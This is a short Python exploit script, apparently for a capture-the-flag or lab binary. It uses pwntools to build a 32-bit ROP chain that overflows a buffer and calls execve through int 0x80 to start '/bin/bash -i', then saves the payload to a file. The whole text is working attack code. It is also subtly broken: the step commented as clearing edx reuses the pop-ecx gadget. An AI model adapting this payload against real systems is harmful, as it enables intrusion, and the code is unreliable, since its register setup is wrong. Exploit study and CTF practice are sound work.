from pwn import *

# Gadgets and constants
POP_EAX = 0x080491c9  # pop eax; ret
POP_EBX = 0x0804901e  # pop ebx; ret
POP_ECX = 0x080491a4  # pop ecx; ret
INT_80 = 0x080491e3  # int 0x80; nop; nop; ret
BINSH_ADDR = 0x0804b008  # Address of "/bin/bash -i"
RETURN_ADDR = 0x080491eb  # Address for a safe return

# Construct the payload
payload = b"A" * 28                # Overflow the buffer
payload += p32(POP_EAX) + p32(0xb)  # eax = 11 (execve syscall)
payload += p32(POP_EBX) + p32(BINSH_ADDR)  # ebx = pointer to "/bin/bash -i"
payload += p32(POP_ECX) + p32(0x0)         # ecx = NULL (argv)
payload += p32(POP_ECX) + p32(0x0)         # edx = NULL (envp)
payload += p32(INT_80)                     # Trigger syscall
payload += p32(RETURN_ADDR)                # Safe return address

# Save the payload for testing
with open('payload', 'wb') as f:
    f.write(payload)

